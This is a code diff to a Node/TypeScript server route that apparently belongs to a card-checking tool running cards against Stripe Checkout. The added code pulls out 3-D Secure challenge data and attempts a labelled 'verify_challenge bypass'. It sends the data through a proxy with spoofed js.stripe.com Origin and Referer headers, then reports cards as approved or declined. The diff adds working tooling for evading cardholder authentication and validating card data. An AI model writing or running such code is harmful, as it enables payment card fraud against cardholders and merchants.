@@ -1735,6 +1735,8 @@ export async function registerRoutes(
           let threeDsUrl = "";
           let sourceId = "";
           let hasNative3DS2 = false;
+          let verificationRqdata = "";
+          let verificationSiteKey = "";
 
           // Extract from payment_intent in confirmJson
           if (confirmJson.payment_intent) {
@@ -1742,9 +1744,20 @@ export async function registerRoutes(
             if (typeof pi === "object") {
               piId = pi.id || "";
               piClientSecret = pi.client_secret || "";
+              console.log("[3DS] PI next_action:", JSON.stringify(pi.next_action || {}).substring(0, 500));
               if (pi.next_action) {
                 if (pi.next_action.redirect_to_url?.url) threeDsUrl = pi.next_action.redirect_to_url.url;
-                if (pi.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || pi.next_action.use_stripe_sdk.stripe_js;
+                const stripeJs = pi.next_action.use_stripe_sdk?.stripe_js;
+                if (stripeJs && typeof stripeJs === "string") {
+                  threeDsUrl = threeDsUrl || stripeJs;
+                } else if (stripeJs && typeof stripeJs === "object") {
+                  // New Stripe 3DS2 challenge flow with verification_url
+                  if (stripeJs.verification_url) {
+                    threeDsUrl = `https://api.stripe.com${stripeJs.verification_url}`;
+                    verificationRqdata = stripeJs.rqdata || "";
+                    verificationSiteKey = stripeJs.site_key || "";
+                  }
+                }
                 if (pi.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = pi.next_action.use_stripe_sdk.three_d_secure_2_source;
                 if (pi.next_action.use_stripe_sdk?.source) sourceId = sourceId || pi.next_action.use_stripe_sdk.source;
                 if (pi.next_action.use_stripe_sdk?.directory_server_encryption) hasNative3DS2 = true;
@@ -1762,7 +1775,8 @@ export async function registerRoutes(
               piClientSecret = si.client_secret || "";
               if (si.next_action) {
                 if (si.next_action.redirect_to_url?.url) threeDsUrl = si.next_action.redirect_to_url.url;
-                if (si.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || si.next_action.use_stripe_sdk.stripe_js;
+                const stripeJs = si.next_action.use_stripe_sdk?.stripe_js;
+                if (stripeJs && typeof stripeJs === "string") threeDsUrl = threeDsUrl || stripeJs;
                 if (si.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = si.next_action.use_stripe_sdk.three_d_secure_2_source;
                 if (si.next_action.use_stripe_sdk?.source) sourceId = sourceId || si.next_action.use_stripe_sdk.source;
                 if (si.next_action.use_stripe_sdk?.directory_server_encryption) hasNative3DS2 = true;
@@ -1773,7 +1787,8 @@ export async function registerRoutes(
           // Try extracting from the confirm body (ppage response has nested intent)
           if (!piId && confirmJson.next_action) {
             if (confirmJson.next_action.redirect_to_url?.url) threeDsUrl = confirmJson.next_action.redirect_to_url.url;
-            if (confirmJson.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || confirmJson.next_action.use_stripe_sdk.stripe_js;
+            const stripeJs = confirmJson.next_action.use_stripe_sdk?.stripe_js;
+            if (stripeJs && typeof stripeJs === "string") threeDsUrl = threeDsUrl || stripeJs;
             if (confirmJson.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = confirmJson.next_action.use_stripe_sdk.three_d_secure_2_source;
           }
 
@@ -1788,7 +1803,7 @@ export async function registerRoutes(
             if (piIdMatch) piId = piIdMatch[0];
           }
 
-          console.log("[3DS] Extracted: piId=", piId, "| sourceId=", sourceId, "| native3DS2=", hasNative3DS2, "| threeDsUrl=", threeDsUrl ? threeDsUrl.substring(0, 80) : "none");
+          console.log("[3DS] Extracted: piId=", piId, "| sourceId=", sourceId, "| native3DS2=", hasNative3DS2, "| threeDsUrl=", threeDsUrl ? (typeof threeDsUrl === "string" ? threeDsUrl.substring(0, 80) : JSON.stringify(threeDsUrl).substring(0, 80)) : "none");
 
           // Native 3DS2 (directory_server_encryption) requires browser fingerprinting — skip bypass
           if (hasNative3DS2 && !sourceId) {
@@ -1799,6 +1814,41 @@ export async function registerRoutes(
 
           let bypassSuccess = false;
           const stripeJsHeaders = { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": ua };
+
+          // New Stripe intent_confirmation_challenge flow (verify_challenge)
+          if (verificationRqdata && piId && piClientSecret && pkLive) {
+            try {
+              console.log("[3DS] Attempting verify_challenge bypass for:", piId);
+              const verifyPayload = new URLSearchParams({
+                rqdata: verificationRqdata,
+                key: pkLive,
+                client_secret: piClientSecret,
+              }).toString();
+              
+              const verifyResp = await proxyRequest(`https://api.stripe.com/v1/payment_intents/${piId}/verify_challenge`, {
+                method: "POST",
+                headers: stripeJsHeaders,
+                body: verifyPayload,
+                proxyUrl,
+                timeout: 10000,
+              });
+              console.log("[3DS] verify_challenge response:", verifyResp.body.substring(0, 400));
+              const verifyData = JSON.parse(verifyResp.body);
+              
+              if (verifyData.status === "succeeded" || verifyData.status === "processing") {
+                bypassSuccess = true;
+                console.log("[3DS] verify_challenge bypass succeeded with status:", verifyData.status);
+              } else if (verifyData.status === "requires_payment_method") {
+                const bypassElapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+                detachPM();
+                return res.json({ card: data, status: "DECLINED", message: "Card declined after 3DS verification", approved: false, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, ipInfo });
+              } else if (verifyData.error) {
+                console.log("[3DS] verify_challenge error:", verifyData.error.message || verifyData.error.code);
+              }
+            } catch (err: any) {
+              console.log("[3DS] verify_challenge exception:", err.message || err);
+            }
+          }
 
           if (sourceId && pkLive) {
             try {
